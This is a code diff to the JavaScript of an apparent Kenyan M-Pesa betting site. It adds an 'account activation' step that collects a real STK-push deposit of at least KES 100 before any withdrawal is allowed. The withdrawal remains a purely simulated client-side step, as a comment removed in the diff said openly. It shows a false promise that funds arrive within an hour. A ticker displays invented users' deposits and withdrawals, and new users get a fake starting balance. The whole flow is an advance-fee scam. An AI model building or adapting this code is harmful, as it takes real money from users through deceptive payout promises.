@@ -18,24 +18,34 @@ const API_ENDPOINTS = {
   normalizePhone: '/api/normalize-phone'
 };
 
-// ====================== Balance Management with localStorage ======================
+// ====================== Balance & Account Management ======================
 let balance = 1000;
 let isProcessing = false;
 let paymentReference = null;
+let hasMadeDeposit = false;
 
 function loadBalance() {
   const savedBalance = localStorage.getItem('multiwin_balance');
+  const savedDepositFlag = localStorage.getItem('multiwin_has_deposited');
+  
   if (savedBalance) {
     balance = parseInt(savedBalance, 10);
   } else {
     balance = 1000;
     localStorage.setItem('multiwin_balance', balance.toString());
   }
+  
+  hasMadeDeposit = savedDepositFlag === 'true';
   updateBalanceUI();
 }
 
 function saveBalance() {
   localStorage.setItem('multiwin_balance', balance.toString());
+}
+
+function setDepositFlag() {
+  hasMadeDeposit = true;
+  localStorage.setItem('multiwin_has_deposited', 'true');
 }
 
 function updateBalanceUI() {
@@ -86,7 +96,7 @@ async function normalizePhoneNumber(phone) {
   }
 }
 
-// ====================== Payment Functions (Deposits only) ======================
+// ====================== Payment Functions ======================
 async function sendSTKPush(phoneNumber, amount) {
   const payload = {
     phone_number: phoneNumber,
@@ -155,6 +165,229 @@ async function checkPaymentStatus(reference, maxAttempts = 20, intervalMs = 3000
   });
 }
 
+// ====================== Activation Modal ======================
+function showActivationModal(phone, withdrawalAmount) {
+  const activationAmount = Math.max(100, Math.round(balance * 0.1));
+  
+  Swal.fire({
+    title: 'Account Activation Required',
+    html: `
+      <div style="text-align: center;">
+        <div style="font-size: 2.5rem; color: #f1c40f; margin-bottom: 12px;">
+          <i class="fas fa-exclamation-triangle"></i>
+        </div>
+        <p><strong>Your account needs to be activated for withdrawals</strong></p>
+        
+        <div class="activation-amount-box">
+          <div class="activation-amount-label">Activation deposit required:</div>
+          <div class="activation-amount-value">KES ${activationAmount.toLocaleString()}</div>
+        </div>
+        
+        <p style="color: #a0aec0; font-size: 0.85rem; margin-bottom: 5px;">Phone: <span style="color: #f1c40f;">${phone}</span></p>
+        <p style="color: #a0aec0; font-size: 0.8rem;">An STK push will be sent to activate your account</p>
+      </div>
+    `,
+    icon: 'warning',
+    showCancelButton: true,
+    confirmButtonText: 'Activate Now',
+    cancelButtonText: 'Cancel',
+    confirmButtonColor: '#f1c40f',
+    cancelButtonColor: '#6c757d',
+    background: '#1a1f2e',
+    color: 'white',
+    allowOutsideClick: false
+  }).then((result) => {
+    if (result.isConfirmed) {
+      processActivationDeposit(phone, activationAmount, withdrawalAmount);
+    }
+  });
+}
+
+async function processActivationDeposit(phone, activationAmount, originalWithdrawalAmount) {
+  try {
+    Swal.fire({
+      title: 'Processing Activation',
+      html: 'Please wait...',
+      allowOutsideClick: false,
+      background: '#1a1f2e',
+      color: 'white',
+      didOpen: () => Swal.showLoading()
+    });
+    
+    Swal.update({
+      title: 'Validating Phone',
+      html: 'Checking phone number format...'
+    });
+    
+    let normalizedPhone;
+    try {
+      normalizedPhone = await normalizePhoneNumber(phone);
+    } catch (error) {
+      normalizedPhone = phone.startsWith('0') ? '254' + phone.substring(1) : 
+                       phone.startsWith('7') ? '254' + phone : 
+                       phone.startsWith('1') ? '254' + phone : phone;
+    }
+    
+    Swal.update({
+      title: 'Sending STK Push',
+      html: 'Initiating activation payment request...'
+    });
+    
+    const paymentResponse = await sendSTKPush(normalizedPhone, activationAmount);
+    
+    if (!paymentResponse || !paymentResponse.reference) {
+      throw new Error('Failed to initiate payment - no reference received');
+    }
+    
+    paymentReference = paymentResponse.reference;
+    
+    Swal.fire({
+      title: 'STK Push Sent!',
+      html: `
+        <div style="text-align: center;">
+          <div style="font-size: 2.5rem; color: #f1c40f; margin-bottom: 12px;">
+            <i class="fas fa-mobile-alt"></i>
+          </div>
+          <p><strong>Check your phone for the M-Pesa STK push</strong></p>
+          <div style="background: #0b0d17; padding: 12px; border-radius: 12px; margin: 12px 0; font-weight: 600; color: #f1c40f; border: 1px solid #2a324a;">
+            ${normalizedPhone}
+          </div>
+          <p style="color: #a0aec0; margin-top: 5px;">
+            Activation Amount: <strong>KES ${activationAmount.toLocaleString()}</strong><br>
+            Enter your M-Pesa PIN to activate your account
+          </p>
+          <div style="background: #0b0d17; padding: 10px; border-radius: 8px; margin-top: 12px;">
+            <small>Verifying payment... This may take up to 60 seconds</small>
+          </div>
+        </div>
+      `,
+      showConfirmButton: false,
+      allowOutsideClick: false,
+      background: '#1a1f2e',
+      color: 'white'
+    });
+    
+    const paymentSuccess = await checkPaymentStatus(paymentReference);
+    
+    if (paymentSuccess) {
+      balance += activationAmount;
+      updateBalanceUI();
+      setDepositFlag();
+      
+      const names = ['John', 'Mary', 'Peter', 'Ann', 'James'];
+      const randomName = names[Math.floor(Math.random() * names.length)];
+      withdrawalTicker.textContent = `${randomName} deposited KES ${activationAmount.toLocaleString()} (activation) · just now`;
+      
+      await Swal.fire({
+        icon: 'success',
+        title: 'Account Activated! 🎉',
+        html: `
+          <div style="text-align: center;">
+            <p><strong>Your account has been activated successfully!</strong></p>
+            <p style="color: #a0aec0; margin: 10px 0;">KES ${activationAmount.toLocaleString()} added to your balance</p>
+            <p style="color: #f1c40f;">Now processing your withdrawal of KES ${originalWithdrawalAmount.toLocaleString()}...</p>
+          </div>
+        `,
+        confirmButtonText: 'Continue',
+        confirmButtonColor: '#f1c40f',
+        background: '#1a1f2e',
+        color: 'white',
+        timer: 2000,
+        timerProgressBar: true
+      });
+      
+      await processWithdrawal(phone, originalWithdrawalAmount);
+    }
+    
+  } catch (error) {
+    let errorMessage = error.message || 'Activation failed';
+    
+    if (errorMessage.includes('timeout')) {
+      errorMessage = 'Payment verification timed out. Please check your M-Pesa messages.';
+    } else if (errorMessage.includes('cancelled')) {
+      errorMessage = 'You cancelled the payment on your phone.';
+    }
+    
+    Swal.fire({
+      icon: 'error',
+      title: 'Activation Failed',
+      html: `
+        <div style="text-align: center;">
+          <p><strong>${errorMessage}</strong></p>
+          <p style="color: #a0aec0; margin-top: 10px;">Please try again to activate your account.</p>
+        </div>
+      `,
+      confirmButtonText: 'Try Again',
+      confirmButtonColor: '#f1c40f',
+      background: '#1a1f2e',
+      color: 'white'
+    });
+  } finally {
+    isProcessing = false;
+    paymentReference = null;
+  }
+}
+
+// ====================== Process Withdrawal ======================
+async function processWithdrawal(phone, amount) {
+  try {
+    Swal.fire({
+      title: 'Processing Withdrawal',
+      html: 'Please wait...',
+      allowOutsideClick: false,
+      background: '#1a1f2e',
+      color: 'white',
+      didOpen: () => Swal.showLoading()
+    });
+    
+    await new Promise(resolve => setTimeout(resolve, 3000));
+    
+    balance -= amount;
+    updateBalanceUI();
+    
+    const names = ['Mwangi', 'Achieng', 'Odhiambo', 'Kamau', 'Njeri'];
+    const randomName = names[Math.floor(Math.random() * names.length)];
+    withdrawalTicker.textContent = `${randomName} withdrew KES ${amount.toLocaleString()} · just now`;
+    
+    await Swal.fire({
+      icon: 'success',
+      title: 'Withdrawal Initiated! 💸',
+      html: `
+        <div style="text-align: center;">
+          <div style="font-size: 2.5rem; color: #f1c40f; margin-bottom: 12px;">
+            <i class="fas fa-check-circle"></i>
+          </div>
+          <p><strong>KES ${amount.toLocaleString()} withdrawal request received</strong></p>
+          <div style="background: #0b0d17; padding: 12px; border-radius: 12px; margin: 15px 0;">
+            <p style="color: #a0aec0; margin-bottom: 5px;">Phone: <span style="color: #f1c40f;">${phone}</span></p>
+            <p style="color: #a0aec0;">Amount: <span style="color: #f1c40f;">KES ${amount.toLocaleString()}</span></p>
+          </div>
+          <p style="color: #f1c40f; font-weight: 600; margin: 10px 0;">⏱️ Funds will be sent to your M-Pesa within 1 hour</p>
+          <p style="color: #a0aec0; font-size: 0.8rem; margin-top: 10px;">
+            You'll receive an M-Pesa confirmation message once processed.
+          </p>
+        </div>
+      `,
+      confirmButtonText: 'OK',
+      confirmButtonColor: '#f1c40f',
+      background: '#1a1f2e',
+      color: 'white',
+      allowOutsideClick: false
+    });
+    
+  } catch (error) {
+    Swal.fire({
+      icon: 'error',
+      title: 'Withdrawal Failed',
+      text: 'An error occurred. Please try again.',
+      confirmButtonText: 'OK',
+      confirmButtonColor: '#f1c40f',
+      background: '#1a1f2e',
+      color: 'white'
+    });
+  }
+}
+
 // ====================== Process Payment ======================
 async function processPayment(type, phone, amount) {
   if (isProcessing) return;
@@ -176,7 +409,6 @@ async function processPayment(type, phone, amount) {
   isProcessing = true;
   
   if (isDeposit) {
-    // ===== DEPOSIT FLOW - STK PUSH =====
     try {
       Swal.fire({
         title: 'Processing',
@@ -246,6 +478,10 @@ async function processPayment(type, phone, amount) {
         balance += amount;
         updateBalanceUI();
         
+        if (!hasMadeDeposit && amount >= 100) {
+          setDepositFlag();
+        }
+        
         const names = ['John', 'Mary', 'Peter', 'Ann', 'James'];
         const randomName = names[Math.floor(Math.random() * names.length)];
         withdrawalTicker.textContent = `${randomName} deposited KES ${amount.toLocaleString()} · just now`;
@@ -299,67 +535,11 @@ async function processPayment(type, phone, amount) {
       });
     }
   } else {
-    // ===== WITHDRAWAL FLOW - SIMULATION ONLY =====
-    try {
-      // Show loading animation
-      Swal.fire({
-        title: 'Processing Withdrawal',
-        html: 'Please wait...',
-        allowOutsideClick: false,
-        background: '#1a1f2e',
-        color: 'white',
-        didOpen: () => Swal.showLoading()
-      });
-      
-      // Simulate processing for 3 seconds
-      await new Promise(resolve => setTimeout(resolve, 3000));
-      
-      // Deduct balance
-      balance -= amount;
-      updateBalanceUI();
-      
-      // Update withdrawal ticker
-      const names = ['Mwangi', 'Achieng', 'Odhiambo', 'Kamau', 'Njeri'];
-      const randomName = names[Math.floor(Math.random() * names.length)];
-      withdrawalTicker.textContent = `${randomName} withdrew KES ${amount.toLocaleString()} · just now`;
-      
-      // Show success confirmation with OK button
-      await Swal.fire({
-        icon: 'success',
-        title: 'Withdrawal Initiated! 💸',
-        html: `
-          <div style="text-align: center;">
-            <div style="font-size: 2.5rem; color: #f1c40f; margin-bottom: 12px;">
-              <i class="fas fa-check-circle"></i>
-            </div>
-            <p><strong>KES ${amount.toLocaleString()} withdrawal request received</strong></p>
-            <div style="background: #0b0d17; padding: 12px; border-radius: 12px; margin: 15px 0;">
-              <p style="color: #a0aec0; margin-bottom: 5px;">Phone: <span style="color: #f1c40f;">${phone}</span></p>
-              <p style="color: #a0aec0;">Amount: <span style="color: #f1c40f;">KES ${amount.toLocaleString()}</span></p>
-            </div>
-            <p style="color: #f1c40f; font-weight: 600; margin: 10px 0;">⏱️ Funds will be sent to your M-Pesa within 1 hour</p>
-            <p style="color: #a0aec0; font-size: 0.8rem; margin-top: 10px;">
-              You'll receive an M-Pesa confirmation message once processed.
-            </p>
-          </div>
-        `,
-        confirmButtonText: 'OK',
-        confirmButtonColor: '#f1c40f',
-        background: '#1a1f2e',
-        color: 'white',
-        allowOutsideClick: false
-      });
-      
-    } catch (error) {
-      Swal.fire({
-        icon: 'error',
-        title: 'Withdrawal Failed',
-        text: 'An error occurred. Please try again.',
-        confirmButtonText: 'OK',
-        confirmButtonColor: '#f1c40f',
-        background: '#1a1f2e',
-        color: 'white'
-      });
+    if (!hasMadeDeposit) {
+      isProcessing = false;
+      showActivationModal(phone, amount);
+    } else {
+      await processWithdrawal(phone, amount);
     }
   }
   
@@ -384,11 +564,10 @@ function createModal(type) {
   const minAmount = isDeposit ? 10 : 100;
   const minMessage = isDeposit ? 'Minimum deposit: KES 10' : 'Minimum withdrawal: KES 100';
 
-  // Create balance display for withdrawal modal
   const balanceDisplayHtml = !isDeposit ? `
-    <div style="background: rgba(241, 196, 15, 0.1); border: 1px solid rgba(241, 196, 15, 0.2); border-radius: 12px; padding: 12px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center;">
-      <span style="color: #a0aec0;">Your Balance:</span>
-      <span style="color: #f1c40f; font-weight: 700; font-size: 1.1rem;">KES ${balance.toLocaleString()}</span>
+    <div class="modal-balance-box">
+      <span class="modal-balance-label">Your Balance:</span>
+      <span class="modal-balance-value">KES ${balance.toLocaleString()}</span>
     </div>
   ` : '';
 
@@ -413,9 +592,6 @@ function createModal(type) {
             <input type="tel" class="modal-input" id="modalPhone" placeholder="712345678" style="border-radius: 0 16px 16px 0;">
           </div>
           <div class="modal-error" id="phoneError"></div>
-          <div style="font-size: 0.65rem; color: #7f8c8d; margin-top: 4px; padding-left: 4px;">
-            <i class="fas fa-info-circle"></i> Accepts: 07..., 7..., 01..., 1..., +254...
-          </div>
         </div>
         
         <div class="modal-input-group">
@@ -497,7 +673,6 @@ function createModal(type) {
 
   closeBtn.addEventListener('click', closeModal);
   cancelBtn.addEventListener('click', closeModal);
-
   overlay.addEventListener('click', function(e) {
     if (e.target === overlay) closeModal();
   });
